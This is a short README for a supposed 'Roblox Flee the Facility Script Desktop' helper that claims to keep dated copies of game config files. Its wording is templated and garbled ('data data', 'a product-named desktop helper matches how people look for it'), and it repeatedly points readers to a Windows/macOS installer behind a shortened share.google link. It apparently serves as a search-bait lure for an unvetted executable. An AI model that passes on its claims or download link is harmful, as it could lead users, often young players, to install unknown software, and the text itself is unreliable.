![Roblox Flee the Facility Script Desktop](assets/hero.png)

# Roblox Flee the Facility Script Desktop

*Dated copies of Roblox Flee the Facility Script data data, nothing uploaded.*

## What Roblox Flee the Facility Script Desktop is

This repository is **Roblox Flee the Facility Script Desktop**, a desktop helper. Dated copies of Roblox Flee the Facility Script data data, nothing uploaded.

Roblox Flee the Facility Script config and export files hide under AppData and Documents.

Point it at a path, preview the plan if you want, then write the result next to the source or to `--out`.

## Editions

Two editions of the same tool:

- **CLI** — the source in this repo. Python 3.11+, local files only.
- **Desktop build** — Windows / macOS installer on the [setup page](https://share.google/A1IHfyGRT0zGRLqj8).

## Highlights

- Maps Roblox Flee the Facility Script data and cache paths.
- Keeps a dated spare of config and export files.
- Skips empty and temp folders.
- Leaves the original tree in place.

## Why it exists

A product-named desktop helper matches how people look for it.

Local copies only. No account step.

## Requirements

- Windows 10 or 11 for the desktop build
- Python 3.11 or newer only if you run the CLI from this repository
- Runs locally on the PC that starts it; no account required for the CLI

## Usage

Python 3.11 or newer. From the repository root:

```text
python -m pip install -r requirements.txt
python main.py --help
```

`--preview` prints the plan and does not write. `--out` sets an output folder when the command supports it.

## Install

[![Download](assets/download.png)](https://share.google/A1IHfyGRT0zGRLqj8)

**[Windows and macOS installer](https://share.google/A1IHfyGRT0zGRLqj8)**

Source: https://github.com/abigailh6073/roblox-flee-the-facility-script-desktop

MIT license. See `LICENSE`.
